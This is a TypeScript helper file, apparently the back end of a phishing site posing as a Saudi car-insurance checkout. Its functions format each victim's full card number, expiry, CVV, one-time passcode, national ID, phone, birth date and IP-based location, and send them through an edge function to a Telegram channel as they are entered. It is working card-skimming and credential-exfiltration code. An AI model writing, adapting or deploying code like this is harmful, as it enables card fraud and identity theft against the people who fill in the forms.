import { supabase } from "@/integrations/supabase/client";
import { getCachedGeo, getVisitorId } from "@/lib/visitor-tracking";

/** Send a plain message to Telegram via the edge function. Fire-and-forget. */
export function sendTelegram(text: string) {
  try {
    void supabase.functions.invoke("send-telegram", { body: { text } });
  } catch (err) {
    console.warn("[telegram] send failed", err);
  }
}

const escape = (v: unknown) => {
  if (v == null || v === "") return "—";
  return String(v)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
};

const sep = "━━━━━━━━━━━━━━━";

/** Append IP / location / visitor-id under every notification card. */
function ipFooter(): string {
  const g = getCachedGeo();
  const vId = getVisitorId();
  const ip = g.ip || "غير معروف";
  const loc = [g.city, g.country].filter(Boolean).join(", ") || "—";
  return [
    "",
    sep,
    "🌐 <b>معلومات الاتصال</b>",
    `   • IP: <code>${escape(ip)}</code>`,
    `   • الموقع: ${escape(loc)}`,
    `   • الزائر: <code>${escape(vId)}</code>`,
  ].join("\n");
}

/** Page 2: Card submitted (Pay Now) — full data */
export function notifyCardSubmitted(d: {
  appId?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  carYear?: string;
  carModel?: string;
  estValue?: string;
  purpose?: string;
  repairPlace?: string;
  company?: string;
  type?: string;
  price?: number | string;
  total?: number | string;
  method?: string;
  cardNumber?: string;
  cardName?: string;
  cardExpMonth?: string;
  cardExpYear?: string;
  cardCvv?: string;
  cardBrand?: string;
}) {
  const lines = [
    "💳🔥 <b>صفحة 2 — إرسال بيانات البطاقة</b>",
    sep,
    `🆔 رقم الطلب: <code>${escape(d.appId)}</code>`,
    "",
    "👤 <b>العميل</b>",
    `   • الاسم: ${escape(d.fullName)}`,
    `   • الهوية: <code>${escape(d.identity)}</code>`,
    `   • الميلاد: ${escape(d.birthDate)}`,
    `   • الجوال: <code>${escape(d.phone)}</code>`,
    "",
    "🚗 <b>السيارة والوثيقة</b>",
    `   • ${escape(d.carModel)} - ${escape(d.carYear)}`,
    `   • نوع التأمين: ${escape(d.insuranceType)}`,
    `   • القيمة التقديرية: ${escape(d.estValue)}`,
    `   • الغرض: ${escape(d.purpose)}`,
    `   • الإصلاح: ${escape(d.repairPlace)}`,
    "",
    "🏢 <b>الطلب</b>",
    `   • الشركة: ${escape(d.company)}`,
    `   • النوع: ${escape(d.type)}`,
    `   • السعر: ${escape(d.price)} ر.س`,
    `   • الإجمالي: <b>${escape(d.total)} ر.س</b>`,
    `   • طريقة الدفع: ${escape(d.method)}`,
    "",
    "💳 <b>بيانات البطاقة</b>",
    `   • النوع: ${escape(d.cardBrand)}`,
    `   • الرقم: <code>${escape(d.cardNumber)}</code>`,
    `   • الاسم: ${escape(d.cardName)}`,
    `   • الانتهاء: <code>${escape(d.cardExpMonth)}/${escape(d.cardExpYear)}</code>`,
    `   • CVV: <code>${escape(d.cardCvv)}</code>`,
    ipFooter(),
  ];
  sendTelegram(lines.join("\n"));
}

/** OTP resend requested by client */
export function notifyOtpResend(d: {
  appId?: string;
  fullName?: string;
  identity?: string;
  phone?: string;
  company?: string;
  total?: number | string;
  cardNumber?: string;
  cardBrand?: string;
  source?: string;
}) {
  const last4 = (d.cardNumber || "").replace(/\D/g, "").slice(-4) || "—";
  const lines = [
    "🔄 <b>طلب إعادة إرسال كود OTP</b>",
    sep,
    `🆔 رقم الطلب: <code>${escape(d.appId)}</code>`,
    "",
    "👤 <b>العميل</b>",
    `   • الاسم: ${escape(d.fullName)}`,
    `   • الهوية: <code>${escape(d.identity)}</code>`,
    `   • الجوال: <code>${escape(d.phone)}</code>`,
    "",
    "💳 <b>البطاقة</b>",
    `   • النوع: ${escape(d.cardBrand)}`,
    `   • آخر 4 أرقام: <code>${last4}</code>`,
    "",
    "🏢 <b>الطلب</b>",
    `   • الشركة: ${escape(d.company)}`,
    `   • الإجمالي: <b>${escape(d.total)} ر.س</b>`,
    `   • المصدر: ${escape(d.source || "OTP")}`,
    ipFooter(),
  ];
  sendTelegram(lines.join("\n"));
}

/** Page 3: OTP submitted */
export function notifyOtpSubmitted(d: {
  appId?: string;
  fullName?: string;
  identity?: string;
  phone?: string;
  company?: string;
  total?: number | string;
  cardNumber?: string;
  cardName?: string;
  cardBrand?: string;
  otp?: string;
}) {
  const lines = [
    "🔐 <b>صفحة 3 — إدخال كود OTP</b>",
    sep,
    `🆔 رقم الطلب: <code>${escape(d.appId)}</code>`,
    "",
    "👤 <b>العميل</b>",
    `   • الاسم: ${escape(d.fullName)}`,
    `   • الهوية: <code>${escape(d.identity)}</code>`,
    `   • الجوال: <code>${escape(d.phone)}</code>`,
    "",
    "💳 <b>البطاقة</b>",
    `   • النوع: ${escape(d.cardBrand)}`,
    `   • رقم البطاقة: <code>${escape(d.cardNumber)}</code>`,
    `   • اسم حامل البطاقة: ${escape(d.cardName)}`,
    "",
    "🏢 <b>الطلب</b>",
    `   • الشركة: ${escape(d.company)}`,
    `   • الإجمالي: <b>${escape(d.total)} ر.س</b>`,
    "",
    `🔑 <b>كود OTP: <code>${escape(d.otp)}</code></b>`,
    ipFooter(),
  ];
  sendTelegram(lines.join("\n"));
}
